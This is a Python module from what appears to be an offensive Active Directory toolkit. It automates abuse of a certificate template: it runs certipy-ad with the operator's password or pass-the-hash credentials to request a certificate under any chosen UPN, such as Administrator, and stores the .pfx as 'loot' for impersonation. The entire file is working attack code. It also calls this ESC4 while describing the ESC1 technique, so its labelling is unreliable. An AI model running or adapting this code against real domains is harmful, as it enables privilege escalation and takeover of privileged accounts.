import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc4(session, template):
    print(blue("[>] ESC4: Abusing certificate template that allows client-specified UPN."))
    print(yellow("[*] This lets us request a certificate with any UPN, enabling impersonation of privileged users."))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA data in session. Run 'adcs enum' first."))
        return

    ca_name = cas[0].get("name")
    if not ca_name or ca_name.lower() == "n/a":
        print(red("[-] Invalid CA name in session metadata."))
        return

    target_upn = input(f"[?] Enter target UPN (e.g., Administrator@{session.domain}): ").strip()
    if not target_upn or "@" not in target_upn:
        print(red("[-] Invalid UPN format."))
        return

    output_file = f"esc4_{target_upn.split('@')[0]}.pfx"

    if session.hash:
        auth = f"-u {session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"-u {session.username} -p '{session.password}'"
    else:
        print(red("[-] No valid authentication method provided."))
        return

    req_cmd = (
        f"certipy-ad req {auth} -dc-ip {session.dc_ip} -ca '{ca_name}' "
        f"-template '{template}' -upn '{target_upn}' -out {output_file}"
    )

    print(blue(f"[*] Requesting certificate as '{target_upn}' using template '{template}'..."))
    out, err = run_command(req_cmd)
    print(out.strip() or err.strip())

    if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
        with open(output_file, "rb") as f:
            save_loot(output_file, f.read(), binary=True)
        print(green(f"[+] Certificate saved to loot/{output_file}"))
        print(green(f"[+] UPN used: {target_upn}"))
        print(green("[+] Certificate request successful!"))
    else:
        print(red("[-] Certificate request failed or file not created."))
        print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))

    print(yellow(f"[*] Command executed: {req_cmd}"))
    